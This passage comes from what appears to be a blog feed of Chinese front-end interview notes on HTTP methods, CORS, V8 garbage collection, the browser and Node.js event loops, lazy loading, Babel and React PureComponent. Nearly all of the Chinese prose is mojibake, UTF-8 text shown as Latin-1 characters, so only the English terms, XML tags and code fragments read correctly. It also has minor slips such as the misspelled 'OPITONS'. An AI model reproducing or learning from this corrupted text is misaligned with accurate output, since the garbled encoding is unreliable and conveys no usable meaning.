çš„è¯·æ±‚æ–¹æ³• HTTP1.0 å®šä¹‰äº†ä¸‰ç§è¯·æ±‚æ–¹æ³•ï¼šGETã€POST å’Œ HEAD æ–¹æ³•ï¼› HTTP1.1 æ–°å¢žäº†äº”ç§è¯·æ±‚æ–¹æ³•ï¼šOPITONSã€PUTã€DELETEã€TRACE å’Œ CONNECTã€‚ HTTP1.1 è§„å®šä¸€ä¸‹è¯·æ±‚æ–¹æ³• GETï¼šè¯·æ±‚èŽ·å– Request-URI æ‰€æ ‡è¯†çš„èµ„æºï¼› POSTï¼šåœ¨ Request-URI æ‰€æ ‡è¯†çš„èµ„æºåŽé™„åŠ æ–°çš„æ•°æ®ï¼› HEADï¼šè¯·æ±‚èŽ·å–ç”± Request-URI æ‰€æ ‡è¯†çš„èµ„æºçš„å“åº”æ¶ˆæ¯æŠ¥å¤´ï¼› PUTï¼šè¯·æ±‚æœåŠ¡å™¨å­˜å‚¨ä¸€ä¸ªèµ„æºï¼Œå¹¶ç”¨ Request-URI ä½œä¸ºå…¶æ ‡è¯†ï¼› DELETEï¼šè¯·æ±‚æœåŠ¡å™¨åˆ é™¤å¯¹åº”æ‰€æ ‡è¯†çš„èµ„æºï¼› TRACEï¼šè¯·æ±‚æœåŠ¡å™¨å›žé€æ”¶åˆ°çš„è¯·æ±‚ä¿¡æ¯ï¼Œä¸»è¦ç”¨äºŽæµ‹è¯•æˆ–è€…è¯Šæ–­ï¼› CONNECTï¼šå»ºç«‹è¿žæŽ¥éš§é“ï¼Œç”¨äºŽä»£ç†æœåŠ¡å™¨ï¼› OPTIONSï¼šåˆ—å‡ºå¯å¯¹èµ„æºå®žè¡Œçš„è¯·æ±‚æ–¹æ³•ï¼Œç”¨æ¥è·¨åŸŸè¯·æ±‚ã€‚ GET å’Œ POST è¯·æ±‚çš„åŒºåˆ« ä»Žç¼“å­˜è§’åº¦çœ‹ï¼ŒGET è¯·æ±‚åŽï¼Œæµè§ˆå™¨ä¼šä¸»åŠ¨ç¼“å­˜ï¼ŒPOST é»˜è®¤æƒ…å†µä¸‹ä¸èƒ½ï¼› ä»Žå‚æ•°è§’åº¦çœ‹ï¼ŒGET è¯·æ±‚ä¸€èˆ¬æ”¾åœ¨ URL ä¸­ï¼Œå› æ­¤ä¸å®‰å…¨ï¼ŒPOST è¯·æ±‚æ”¾åœ¨è¯·æ±‚ä½“ä¸­ï¼Œç›¸å¯¹è€Œè¨€è¾ƒä¸ºå®‰å…¨ï¼Œä½†æ˜¯åœ¨æŠ“åŒ…çš„æƒ…å†µä¸‹éƒ½æ˜¯ä¸€æ ·çš„ï¼› ä»Žç¼–ç è§’åº¦çœ‹ï¼ŒGET è¯·æ±‚åªèƒ½ URL ç¼–ç ï¼Œåªèƒ½æŽ¥å— ASCII ç ï¼Œè€Œ POST æ”¯æŒæ›´å¤šçš„ç¼–ç ç±»åž‹ä¸”ä¸å¯¹æ•°æ®ç±»åž‹é™åˆ¶ï¼› GET è¯·æ±‚å¹‚ç­‰ï¼ŒPOST è¯·æ±‚ä¸å¹‚ç­‰ï¼Œå¹‚ç­‰æŒ‡å‘é€ M å’Œ N æ¬¡è¯·æ±‚ï¼ˆä¸¤è€…ä¸ç›¸åŒä¸”éƒ½å¤§äºŽ 1ï¼‰ï¼ŒæœåŠ¡å™¨ä¸Šèµ„æºçš„çŠ¶æ€ä¸€è‡´ï¼› GET è¯·æ±‚ä¼šä¸€æ¬¡æ€§å‘é€è¯·æ±‚æŠ¥æ–‡ï¼ŒPOST è¯·æ±‚é€šå¸¸èŒƒå›´ä¸¤ä¸ª TCP æ•°æ®åŒ…ï¼Œé¦–å…ˆå‘ header éƒ¨åˆ†ï¼Œå¦‚æžœæœåŠ¡å™¨å“åº” 100ï¼ˆcontinueï¼‰ï¼Œç„¶åŽå‘ body éƒ¨åˆ†ï¼› options æ–¹æ³•ä½œç”¨ OPTIONS è¯·æ±‚ä¸Ž HEAD ç±»ä¼¼ï¼Œä¸€èˆ¬ä¹Ÿæ˜¯ç”¨äºŽå®¢æˆ·ç«¯æŸ¥çœ‹æœåŠ¡å™¨çš„æ€§èƒ½ï¼› è¿™ä¸ªæ–¹æ³•ä¼šè¯·æ±‚æœåŠ¡å™¨è¿”å›žè¯¥èµ„æºæ‰€æ”¯æŒçš„æ‰€æœ‰ HTTP è¯·æ±‚æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ä¼šç”¨â€œ*â€æ¥ä»£æ›¿èµ„æºåç§°ï¼Œå‘æœåŠ¡å™¨å‘é€ OPTIONS è¯·æ±‚ï¼Œå¯ä»¥æµ‹è¯•æœåŠ¡å™¨åŠŸèƒ½æ˜¯å¦æ­£å¸¸ï¼› JS çš„ XMLHttpRequest å¯¹è±¡è¿›è¡Œ CORS è·¨åŸŸèµ„æºå…±äº«æ—¶ï¼Œå¯¹äºŽå¤æ‚è¯·æ±‚ï¼Œå°±ä¼šä½¿ç”¨ OPTIONS æ–¹æ³•å‘é€å—…æŽ¢è¯·æ±‚ï¼Œä»¥åˆ¤æ–­æ˜¯å¦å¯¹æŒ‡å®šèµ„æºçš„è®¿é—®æƒé™ã€‚ å¯¹å¤´é˜»å¡žé—®é¢˜ä»€ä¹ˆæ˜¯é˜Ÿå¤´é˜»å¡žå¯¹äºŽæ¯ä¸ª HTTP è¯·æ±‚è€Œè¨€ï¼Œè¿™äº›ä»»åŠ¡æ˜¯ä¼šè¢«æ”¾å…¥ä¸€ä¸ªä»»åŠ¡é˜Ÿåˆ—ä¸­ä¸²è¡Œæ‰§è¡Œçš„ï¼Œä¸€æ—¦é˜Ÿé¦–ä»»åŠ¡è¯·æ±‚å¤ªæ…¢æ—¶ï¼Œå°±ä¼šé˜»å¡žåŽé¢çš„è¯·æ±‚å¤„ç†ï¼Œè¿™å°±æ˜¯ HTTP é˜Ÿå¤´é˜»å¡žé—®é¢˜ã€‚ å¹¶å‘è¿žæŽ¥æˆ‘ä»¬çŸ¥é“å¯¹äºŽä¸€ä¸ªåŸŸåè€Œè¨€ï¼Œæ˜¯å…è®¸åˆ†é…å¤šä¸ªé•¿è¿žæŽ¥çš„ï¼Œé‚£ä¹ˆå¯ä»¥ç†è§£æˆå¢žåŠ äº†ä»»åŠ¡é˜Ÿåˆ—ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸ä¼šå¯¼è‡´ä¸€ä¸ªä»»åŠ¡é˜»å¡žäº†æ”¹ä»»åŠ¡é˜Ÿåˆ—çš„å…¶ä»–ä»»åŠ¡ï¼Œåœ¨ RFC è§„èŒƒä¸­è§„å®šå®¢æˆ·ç«¯æœ€å¤šå¹¶å‘ 2 ä¸ªè¿žæŽ¥ï¼Œä¸è¿‡å®žé™…æƒ…å†µè¦æ›´å¤šï¼Œæ¯”å¦‚ï¼ŒChrome æ˜¯ 6 ä¸ªã€‚ åŸŸååˆ†ç‰‡é¡¾åæ€ä¹‰ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸€ä¸ªåŸŸåä¸‹åˆ†å‡ºä¸¤ä¸ªäºŒçº§åŸŸåï¼Œè€Œå®ƒä»¬æœ€ç»ˆæŒ‡å‘çš„è¿˜æ˜¯åŒä¸€ä¸ªæœåŠ¡å™¨ï¼Œè¿™æ ·å­çš„è¯å°±å¯ä»¥å¤„ç†çš„ä»»åŠ¡é˜Ÿåˆ—æ›´å¤šï¼Œè§£å†³é˜Ÿå¤´é˜»å¡žé—®é¢˜ã€‚ è·¨åŸŸæµè§ˆå™¨éµå¾ªåŒæºç­–ç•¥ï¼Œåè®®ï¼ˆschemeï¼‰ã€ä¸»æœºï¼ˆhostï¼‰å’Œç«¯å£å·ï¼ˆportï¼‰éƒ½ç›¸åŒç§°ä¸ºåŒæºã€‚éžåŒæºç«™ç‚¹æœ‰ä¸€äº›é™åˆ¶ï¼š ä¸èƒ½è¯»å–å’Œä¿®æ”¹å¯¹æ–¹çš„ DOMï¼› ä¸èƒ½è®¿é—®å¯¹æ–¹çš„ Cookieã€indexDB å’Œ localStorageã€‚ å½“æµè§ˆå™¨å‘ç›®æ ‡ URI å‘ Ajax è¯·æ±‚æ—¶ï¼Œå½“å‰ URL å’Œç›®æ ‡ URL ä¸åŒæºï¼Œåˆ™äº§ç”Ÿè·¨åŸŸï¼Œè¢«ç§°ä¸ºè·¨åŸŸè¯·æ±‚ã€‚åº•å±‚åŽŸç†æ˜¯ç”±äºŽæµè§ˆå™¨å°†æ¯ä¸ªæ¸²æŸ“è¿›ç¨‹è£…è¿›äº†æ²™ç®±ï¼Œä¸ºäº†é˜²æ­¢ CPU èŠ¯ç‰‡ä¸€ç›´å­˜åœ¨çš„ Spectre å’Œ Meltdown æ¼æ´žï¼Œé‡‡å–äº†ç«™ç‚¹éš”ç¦»æ‰‹æ®µï¼Œç»™æ¯ä¸ªä¸åŒç«™ç‚¹ï¼ˆä¸€çº§åŸŸåä¸åŒï¼‰åˆ†é…äº†æ²™ç®±ï¼Œäº’è¡¥å¹²æ‰°ã€‚ CORSCORS æ˜¯ W3C çš„ä¸€ä¸ªæ ‡å‡†ï¼Œå…¨ç§°æ˜¯è·¨åŸŸèµ„æºå…±äº«ã€‚å®ƒéœ€è¦æµè§ˆå™¨å’ŒæœåŠ¡å™¨çš„å…±åŒæ”¯æŒï¼Œåœ¨å¼„æ¸…æ¥š CORS åŽŸç†ä¹‹å‰ï¼Œéœ€è¦çŸ¥é“ä¸¤ä¸ªæ¦‚å¿µï¼šç®€å•è¯·æ±‚å’Œéžç®€å•è¯·æ±‚ã€‚ å±žäºŽå¦‚ä¸‹æ¡ä»¶çš„æ˜¯ç®€å•è¯·æ±‚ï¼š è¯·æ±‚æ–¹æ³•ä¸º GETã€POST å’Œ HEADï¼› è¯·æ±‚å¤´çš„å–å€¼èŒƒå›´ï¼šAcceptã€Accept-Languageã€Content-Languageã€Content-Typeï¼ˆåªé™äºŽä¸‰ä¸ªå€¼ application/x-www-form-urlencodedã€multipart/form-data å’Œ text/plainï¼‰ã€‚ éžç®€å•è¯·æ±‚ä¸»è¦ä½“çŽ°åœ¨ä¸¤ä¸ªæ–¹é¢ï¼šé¢„æ£€è¯·æ±‚å’Œå“åº”å­—æ®µã€‚ é¢„æ£€è¯·æ±‚çš„æ–¹æ³•æ˜¯ OPTIONSï¼Œè¿˜ä¼šåŠ ä¸Šä¸¤ä¸ªå…³é”®å­—æ®µï¼š Access-Control-Request-Methodï¼Œåˆ—å‡º CORS è¯·æ±‚ç”¨åˆ°å“ªä¸ª HTTP æ–¹æ³•ï¼› Access-Control-Request-Headersï¼Œæ¸…é™¤ CORS è¯·æ±‚å°†è¦åŠ ä¸Šä»€ä¹ˆè¯·æ±‚å¤´ å…¶ä¸­æœ‰è¿™æ ·å‡ ä¸ªå…³é”®çš„å“åº”å¤´å­—æ®µ: Access-Control-Allow-Origin: è¡¨ç¤ºå¯ä»¥å…è®¸è¯·æ±‚çš„æºï¼Œå¯ä»¥å¡«å…·ä½“çš„æºåï¼Œä¹Ÿå¯ä»¥å¡«*è¡¨ç¤ºå…è®¸ä»»æ„æºè¯·æ±‚ã€‚Access-Control-Allow-Methods: è¡¨ç¤ºå…è®¸çš„è¯·æ±‚æ–¹æ³•åˆ—è¡¨ã€‚Access-Control-Allow-Credentials: ç®€å•è¯·æ±‚ä¸­å·²ç»ä»‹ç»ã€‚Access-Control-Allow-Headers: è¡¨ç¤ºå…è®¸å‘é€çš„è¯·æ±‚å¤´å­—æ®µAccess-Control-Max-Age: é¢„æ£€è¯·æ±‚çš„æœ‰æ•ˆæœŸï¼Œåœ¨æ­¤æœŸé—´ï¼Œä¸ç”¨å‘å‡ºå¦å¤–ä¸€æ¡é¢„æ£€è¯·æ±‚ã€‚ å‚è€ƒ ï¼ˆå»ºè®®ç²¾è¯»ï¼‰HTTP çµé­‚ä¹‹é—®ï¼Œå·©å›ºä½ çš„ HTTP çŸ¥è¯†ä½“ç³»]]></content>
      <categories>
        <category>é¢è¯•</category>
      </categories>
      <tags>
        <tag>http</tag>
        <tag>é¢è¯•</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å‰ç«¯é¢è¯•ä¹‹é«˜çº§javascript]]></title>
    <url>%2F2021%2F10%2F17%2Finter-js-pro%2F</url>
    <content type="text"><![CDATA[åžƒåœ¾å›žæ”¶æœºåˆ¶Javascript åžƒåœ¾å›žæ”¶æœºåˆ¶åˆ†ä¸ºï¼šæ ‡è®°æ¸…é™¤å’Œå¼•ç”¨è®¡æ•°ã€‚å¸¸ç”¨çš„åžƒåœ¾å›žæ”¶æ–¹å¼æ˜¯æ ‡è®°æ¸…é™¤ã€‚åžƒåœ¾æ”¶é›†å™¨åœ¨è¿è¡Œçš„æ—¶å€™ä¼šç»™å­˜å‚¨åœ¨å†…å­˜ä¸­çš„æ‰€æœ‰å˜é‡éƒ½åŠ ä¸Šæ ‡è®°ï¼Œç„¶åŽï¼Œå®ƒä¼šåŽ»æŽ‰çŽ¯å¢ƒä¸­çš„å˜é‡ä»¥åŠè¢«çŽ¯å¢ƒä¸­çš„å˜é‡å¼•ç”¨çš„å˜é‡çš„æ ‡è®°ã€‚åœ¨æ­¤ä¹‹åŽå†è¢«åŠ ä¸Šæ ‡è®°çš„å˜é‡å°†è¢«è§†ä¸ºå‡†å¤‡åˆ é™¤çš„å˜é‡ã€‚æœ€åŽåžƒåœ¾æ”¶é›†å™¨é”€æ¯é‚£äº›å¸¦æ ‡è®°çš„å€¼å¹¶ä¸”å›žæ”¶å®ƒä»¬æ‰€å ç”¨çš„å†…å­˜ç©ºé—´ã€‚å¦ä¸€ç§ä¸å¸¸ç”¨çš„åžƒåœ¾æ”¶é›†ç­–ç•¥æ˜¯å¼•ç”¨è®¡æ•°ã€‚å¼•ç”¨è®¡æ•°çš„å«ä¹‰æ˜¯è·Ÿè¸ªè®°å½•æ¯ä¸ªå€¼è¢«å¼•ç”¨çš„æ¬¡æ•°ã€‚å½“å£°æ˜Žäº†ä¸€ä¸ªå˜é‡å¹¶å°†ä¸€ä¸ªå¼•ç”¨ç±»åž‹å€¼èµ‹å€¼ç»™è¯¥å˜é‡æ—¶ï¼Œåˆ™è¿™ä¸ªå€¼çš„å¼•ç”¨æ¬¡æ•°å°±æ˜¯ 1ã€‚å¦‚æžœåŒä¸€ä¸ªå€¼åˆèµ‹å€¼ç»™å¦å¤–ä¸€ä¸ªå˜é‡ï¼Œåˆ™è¯¥å€¼çš„å¼•ç”¨æ¬¡æ•°åŠ  1ã€‚ç›¸åï¼Œå¦‚æžœåŒ…å«å¯¹è¿™ä¸ªå€¼å¼•ç”¨çš„å˜é‡æœ‰å¾—åˆ°äº†å¦å¤–ä¸€ä¸ªå€¼ï¼Œåˆ™è¿™ä¸ªå€¼çš„å¼•ç”¨æ¬¡æ•°å‡ 1ã€‚å½“è¿™ä¸ªå€¼çš„å¼•ç”¨æ¬¡æ•°å˜æˆ 0 æ—¶ï¼Œè¯´æ˜Žæ²¡åŠžæ³•å†è®¿é—®è¿™ä¸ªå€¼äº†ã€‚å½“åžƒåœ¾æ”¶é›†å™¨ä¸‹æ¬¡å†è¿è¡Œï¼Œå°±ä¼šé‡Šæ”¾é‚£äº›å¼•ç”¨æ¬¡æ•°ä¸º 0 çš„å€¼æ‰€å å†…å­˜ã€‚ V8 å¼•æ“Žåžƒåœ¾å›žæ”¶å·¥ä½œåŽŸç† æ ˆä¸­æ•°æ®å›žæ”¶ï¼šæ‰§è¡ŒçŠ¶æ€æŒ‡é’ˆ ESP åœ¨æ‰§è¡Œæ ˆä¸­ç§»åŠ¨ï¼Œç§»è¿‡æŸæ‰§è¡Œä¸Šä¸‹æ–‡ï¼Œå°±ä¼šè¢«é”€æ¯ï¼› å †ä¸­æ•°æ®å›žæ”¶ï¼šV8 å¼•æ“Žé‡‡ç”¨æ ‡è®°-æ¸…é™¤ç®—æ³•ï¼› V8 æŠŠå †åˆ†ä¸ºä¸¤ä¸ªåŒºåŸŸâ€”â€”æ–°ç”Ÿä»£å’Œè€ç”Ÿä»£ï¼Œåˆ†åˆ«ä½¿ç”¨å‰¯ã€ä¸»åžƒåœ¾å›žæ”¶å™¨ï¼› å‰¯åžƒåœ¾å›žæ”¶å™¨è´Ÿè´£æ–°ç”Ÿä»£åžƒåœ¾å›žæ”¶ï¼Œå°å¯¹è±¡ï¼ˆ1 ï½ž 8Mï¼‰ä¼šè¢«åˆ†é…åˆ°è¯¥åŒºåŸŸå¤„ç†ï¼› æ–°ç”Ÿä»£é‡‡ç”¨ scavenge ç®—æ³•å¤„ç†ï¼šå°†æ–°ç”Ÿä»£ç©ºé—´åˆ†ä¸ºä¸¤åŠï¼Œä¸€åŠç©ºé—²ï¼Œä¸€åŠå­˜å¯¹è±¡ï¼Œå¯¹å¯¹è±¡åŒºåŸŸåšæ ‡è®°ï¼Œå­˜æ´»å¯¹è±¡å¤åˆ¶æŽ’åˆ—åˆ°ç©ºé—²åŒºåŸŸï¼Œæ²¡æœ‰å†…å­˜ç¢Žç‰‡ï¼Œå®ŒæˆåŽï¼Œæ¸…ç†å¯¹è±¡åŒºåŸŸï¼Œè§’è‰²åè½¬ï¼› æ–°ç”Ÿä»£åŒºåŸŸä¸¤æ¬¡åžƒåœ¾å›žæ”¶è¿˜å­˜æ´»çš„å¯¹è±¡æ™‹å‡è‡³è€ç”Ÿä»£åŒºåŸŸï¼› ä¸»åžƒåœ¾å›žæ”¶å™¨è´Ÿè´£è€ç”ŸåŒºåžƒåœ¾å›žæ”¶ï¼Œå¤§å¯¹è±¡ï¼Œå­˜æ´»æ—¶é—´é•¿ï¼› è€ç”Ÿä»£åŒºåŸŸé‡‡ç”¨æ ‡è®°-æ¸…é™¤ç®—æ³•å›žæ”¶åžƒåœ¾ï¼šä»Žæ ¹å…ƒç´ å¼€å§‹ï¼Œé€’å½’ï¼Œå¯åˆ°è¾¾çš„å…ƒç´ æ´»åŠ¨å…ƒç´ ï¼Œå¦åˆ™æ˜¯åžƒåœ¾æ•°æ®ï¼› æ ‡è®°-æ¸…é™¤ç®—æ³•åŽï¼Œä¼šäº§ç”Ÿå¤§é‡ä¸è¿žç»­çš„å†…å­˜ç¢Žç‰‡ï¼Œæ ‡è®°-æ•´ç†ç®—æ³•è®©æ‰€æœ‰å­˜æ´»çš„å¯¹è±¡å‘ä¸€ç«¯ç§»åŠ¨ï¼Œç„¶åŽæ¸…ç†æŽ‰è¾¹ç•Œä»¥å¤–çš„å†…å­˜ï¼› ä¸ºé™ä½Žè€ç”Ÿä»£åžƒåœ¾å›žæ”¶é€ æˆçš„å¡é¡¿ï¼ŒV8 å°†æ ‡è®°è¿‡ç¨‹è¢«åˆ‡åˆ†ä¸ºä¸€ä¸ªä¸ªå­æ ‡è®°è¿‡ç¨‹ï¼Œè®©åžƒåœ¾å›žæ”¶å’Œ JavaScript æ‰§è¡Œäº¤æ›¿è¿›è¡Œã€‚ äº‹ä»¶å¾ªçŽ¯ï¼ˆEvent Loopï¼‰æœºåˆ¶æµè§ˆä¸­ Event Loop è¿è¡Œæœºåˆ¶ Javascript æ˜¯å•çº¿ç¨‹è¯­è¨€ã€‚ 1ã€æ‰€æœ‰åŒæ­¥ä»»åŠ¡éƒ½åœ¨ä¸»çº¿ç¨‹ä¸Šæ‰§è¡Œï¼Œå½¢æˆä¸€ä¸ªæ‰§è¡Œæ ˆï¼›2ã€ä¸»çº¿ç¨‹ä¹‹å¤–ï¼Œè¿˜å­˜åœ¨ä¸€ä¸ªâ€œä»»åŠ¡é˜Ÿåˆ—â€ã€‚åªè¦å¼‚æ­¥ä»»åŠ¡æœ‰äº†è¿è¡Œç»“æžœï¼Œå°±åœ¨â€œä»»åŠ¡é˜Ÿåˆ—â€ä¸­æ”¾ç½®ä¸€ä¸ªäº‹ä»¶ï¼›3ã€ä¸€æ—¦â€œæ‰§è¡Œæ ˆâ€ä¸­æ‰€æœ‰åŒæ­¥ä»»åŠ¡æ‰§è¡Œå®Œæ¯•ï¼Œç³»ç»Ÿå°±ä¼šè¯»å–â€œä»»åŠ¡é˜Ÿåˆ—â€ï¼Œçœ‹çœ‹é‡Œé¢æœ‰å“ªäº›äº‹ä»¶ã€‚é‚£äº›å¯¹åº”çš„å¼‚æ­¥ä»»åŠ¡ï¼ŒäºŽæ˜¯ç»“æŸç­‰å¾…çŠ¶æ€ï¼Œè¿›å…¥æ‰§è¡Œæ ˆï¼Œå¼€å§‹æ‰§è¡Œï¼›4ã€ä¸»çº¿ç¨‹ä¸æ–­é‡å¤ä¸Šé¢çš„ç¬¬ä¸‰æ­¥ã€‚ Node.js çš„ Event Loop Node.js ä¹Ÿæ˜¯å•çº¿ç¨‹ Event Loopã€‚ 1ã€V8 å¼•æ“Žè§£æž JavaScript è„šæœ¬ï¼›2ã€è§£æžåŽçš„ä»£ç ï¼Œè°ƒç”¨ Node APIï¼›3ã€libuv åº“è´Ÿè´£ Node API çš„æ‰§è¡Œã€‚å®ƒå°†ä¸åŒçš„ä»»åŠ¡åˆ†é…ç»™ä¸åŒçš„çº¿ç¨‹ï¼Œå½¢æˆä¸€ä¸ªäº‹ä»¶å¾ªçŽ¯ï¼ˆEvent Loopï¼‰ï¼Œä»¥å¼‚æ­¥çš„æ–¹å¼å°†ä»»åŠ¡çš„æ‰§è¡Œç»“æžœè¿”å›žç»™ V8 å¼•æ“Žï¼›4ã€V8 å¼•æ“Žå†å°†ç»“æžœè¿”å›žç»™ç”¨æˆ·ã€‚ Node.js ä¸­ libuv å¼•ç”¨çš„äº‹ä»¶å¾ªçŽ¯åˆ†ä¸º 6 ä¸ªé˜¶æ®µï¼š 1ã€timers é˜¶æ®µï¼šè¿™ä¸ªé˜¶æ®µæ‰§è¡Œ timerï¼ˆsetTimeoutã€setIntervalï¼‰çš„å›žè°ƒï¼›2ã€I/O callbacks é˜¶æ®µï¼šå¤„ç†ä¸€äº›ä¸Šä¸€è½®å¾ªçŽ¯ä¸­çš„å°‘æ•°æœªæ‰§è¡Œçš„ I/O å›žè°ƒï¼›3ã€idleï¼Œprepare é˜¶æ®µï¼šä»… node å†…éƒ¨ä½¿ç”¨ï¼›4ã€poll é˜¶æ®µï¼šèŽ·å–æ–°çš„ I/O äº‹ä»¶ï¼Œé€‚å½“çš„æ¡ä»¶ä¸‹ node å°†é˜»å¡žåœ¨è¿™é‡Œï¼›5ã€check é˜¶æ®µï¼šæ‰§è¡Œ setImmediate çš„å›žè°ƒï¼›6ã€close callbacks é˜¶æ®µï¼šæ‰§è¡Œ socket çš„ close äº‹ä»¶å›žè°ƒï¼› é¡ºåºï¼šå¤–éƒ¨è¾“å…¥æ•°æ®â€“&gt;è½®è¯¢é˜¶æ®µï¼ˆpollï¼‰â€“&gt;æ£€æŸ¥é˜¶æ®µï¼ˆcheckï¼‰â€“&gt;å…³é—­äº‹ä»¶å›žè°ƒé˜¶æ®µï¼ˆclose callbackï¼‰â€“&gt;å®šæ—¶å™¨æ£€æŸ¥é˜¶æ®µï¼ˆtimerï¼‰â€“&gt;I/O äº‹ä»¶å›žè°ƒé˜¶æ®µï¼ˆI/O callbacksï¼‰â€“&gt;é—²ç½®é˜¶æ®µï¼ˆidleï¼Œprepareï¼‰â€“&gt;è½®è¯¢é˜¶æ®µ process.nextTick ç‹¬ç«‹äºŽ Event Loop ä¹‹å¤–ï¼Œå®ƒæœ‰ä¸€ä¸ªè‡ªå·±çš„é˜Ÿåˆ—ï¼Œå½“æ¯ä¸ªé˜¶æ®µå®ŒæˆåŽï¼Œå¦‚æžœå­˜åœ¨ nextTick é˜Ÿåˆ—ï¼Œå°±ä¼šæ¸…ç©ºé˜Ÿåˆ—ä¸­æ‰€æœ‰å›žè°ƒå‡½æ•°ï¼Œå¹¶ä¸”ä¼˜å…ˆäºŽå…¶ä»– microtask æ‰§è¡Œã€‚ æµè§ˆå™¨å’Œ Node.js çš„ Event Loop åŒºåˆ« æµè§ˆå™¨çŽ¯å¢ƒä¸‹ï¼Œmicrotask çš„ä»»åŠ¡é˜Ÿåˆ—æ˜¯æ¯ä¸ª macrotask æ‰§è¡Œå®ŒåŽæ‰§è¡Œã€‚è€Œåœ¨ Node.js ä¸­ï¼Œmicrotask ä¼šåœ¨äº‹ä»¶å¾ªçŽ¯çš„å„ä¸ªé˜¶æ®µä¹‹é—´æ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªé˜¶æ®µæ‰§è¡Œå®Œæ¯•ï¼Œå°±ä¼šåŽ»æ‰§è¡Œ microtask é˜Ÿåˆ—çš„ä»»åŠ¡ã€‚ å‚è€ƒï¼šJavaScript è¿è¡Œæœºåˆ¶è¯¦è§£ï¼šå†è°ˆ Event Loop ä»Žè¾“å…¥ä¸€ä¸ª URL åœ°å€åˆ°æµè§ˆå™¨å®Œæˆæ¸²æŸ“çš„æ•´ä¸ªè¿‡ç¨‹ç®€å•ç‰ˆï¼š æµè§ˆå™¨æŸ¥æ‰¾å½“å‰ URL æ˜¯å¦å­˜åœ¨ç¼“å­˜ï¼Œå¹¶æ¯”è¾ƒç¼“å­˜æ˜¯å¦è¿‡æœŸï¼› DNS è§£æž URL å¯¹åº”çš„ IPï¼› æ ¹æ® IP å»ºç«‹ TCP è¿žæŽ¥ï¼ˆä¸‰æ¬¡æ¡æ‰‹ï¼‰ï¼› å‘é€ HTTP è¯·æ±‚ï¼› æœåŠ¡å™¨å¤„ç†è¯·æ±‚ï¼Œæµè§ˆå™¨æŽ¥å— HTTP å“åº”ï¼› æµè§ˆå™¨è§£æžå¹¶æ¸²æŸ“é¡µé¢ï¼› å…³é—­ TCP è¿žæŽ¥ï¼ˆå››æ¬¡æŒ¥æ‰‹ï¼‰ã€‚ å›¾ç‰‡æ‡’åŠ è½½æ–¹æ¡ˆ åŽŸç”Ÿæ”¯æŒ Chrome76+æ”¯æŒï¼Œæ ‡ç­¾ loading å±žæ€§è®¾ä¸º â€˜lazyâ€™ã€‚ element.getBoundingClientRect().top &lt; document.documentElement.clientHeightã€‚ element.offsetTop - document.documentElement.scrollTop &lt; document.documentElement.clientHeight IntersectionObserver babel æ˜¯ä»€ä¹ˆï¼ŒåŽŸç†æ˜¯ä»€ä¹ˆï¼ŸBabel æ˜¯ä¸€ä¸ª Javascript ç¼–è¯‘å™¨ã€‚ä»–æŠŠæœ€æ–°ç‰ˆçš„ JavaScript ç¼–è¯‘æˆç›®æ ‡æµè§ˆå™¨çŽ¯å¢ƒå¯æ‰§è¡Œç‰ˆæœ¬ã€‚ Babel å¤„ç†åˆ†ä¸º 3 æ­¥ï¼šè§£æžï¼ˆparseï¼‰ï¼Œè½¬æ¢ï¼ˆtransformï¼‰å’Œ ç”Ÿæˆï¼ˆgenerateï¼‰ã€‚ è§£æžã€‚å°†ä»£ç è§£æžæˆæŠ½è±¡è¯­æ³•æ ‘ï¼ˆASTï¼‰ï¼Œæ¯ä¸ª js å¼•æ“Žéƒ½æœ‰è‡ªå·±çš„ AST è§£æžå™¨ï¼Œè€Œ Babel æ˜¯é€šè¿‡ Babylon å®žçŽ°ã€‚åœ¨è§£æžè¿‡ç¨‹ä¸­æœ‰ä¸¤ä¸ªé˜¶æ®µï¼šè¯æ³•åˆ†æžå’Œè¯­æ³•åˆ†æžã€‚è¯æ³•åˆ†æžé˜¶æ®µæŠŠå­—ç¬¦ä¸²å½¢å¼çš„ä»£ç è½¬æ¢ä¸ºä»¤ç‰Œï¼ˆtokensï¼‰æµï¼Œä»¤ç‰Œç±»ä¼¼ AST ä¸­èŠ‚ç‚¹ï¼›è€Œè¯­æ³•åˆ†æžé˜¶æ®µåˆ™ä¼šæŠŠä¸€ä¸ªä»¤ç‰Œæµè½¬åŒ–æˆ AST çš„å½¢å¼ï¼ŒåŒæ—¶è¿™ä¸ªé˜¶æ®µä¼šæŠŠä»¤ç‰Œä¸­çš„ä¿¡æ¯è½¬æ¢æˆ AST çš„è¡¨è¿°ç»“æž„ã€‚ è½¬æ¢ã€‚Babel æŽ¥å—å¾—åˆ° AST å¹¶é€šè¿‡ babel-traverse å¯¹å…¶è¿›è¡Œæ·±åº¦ä¼˜å…ˆéåŽ†ï¼Œåœ¨æ­¤è¿‡ç¨‹ä¸­å¯¹èŠ‚ç‚¹è¿›è¡Œæ·»åŠ ã€æ›´æ–°åŠç§»é™¤æ“ä½œã€‚è¿™éƒ¨åˆ†ä¹Ÿæ˜¯ Babel æ’ä»¶ä»‹å…¥å·¥ä½œçš„éƒ¨åˆ†ã€‚ ç”Ÿæˆã€‚å°†ç»è¿‡è½¬æ¢çš„ AST é€šè¿‡ babel-generator å†è½¬æ¢æˆ js ä»£ç ï¼Œè¿‡ç¨‹å°±æ˜¯æ·±åº¦ä¼˜å…ˆéåŽ†æ•´ä¸ª ASTï¼Œç„¶åŽæž„å»ºå¯ä»¥è¡¨ç¤ºè½¬æ¢åŽçš„ä»£ç çš„å­—ç¬¦ä¸²ã€‚ PureComponent ç»„ä»¶å’Œ memo ç»„ä»¶ React.PureComponent ä¸­å®žçŽ°äº† shouldComponentUpdate()ï¼Œæ˜¯ä»¥æµ…å±‚æ¯”è¾ƒ prop å’Œ state çš„æ–¹å¼å®žçŽ°è¯¥å‡½æ•°ã€‚å¦‚æžœå¯¹è±¡ä¸­åŒ…å«å¤æ‚çš„æ•°æ®ç»“æž„ï¼Œå¯èƒ½æ— æ³•æ£€æŸ¥æ·±å±‚å·®åˆ«ï¼Œäº§ç”Ÿé”™è¯¯å¯¹æ¯”ç»“æžœã€‚åœ¨ state å’Œ prop æ¯”è¾ƒç®€å•æ—¶ï¼Œæ‰ä½¿ç”¨ï¼Œæˆ–è€…åœ¨æ·±å±‚æ¬¡æ•°æ®ç»“æž„å‘ç”Ÿå˜åŒ–æ—¶è°ƒç”¨ forceUpdate 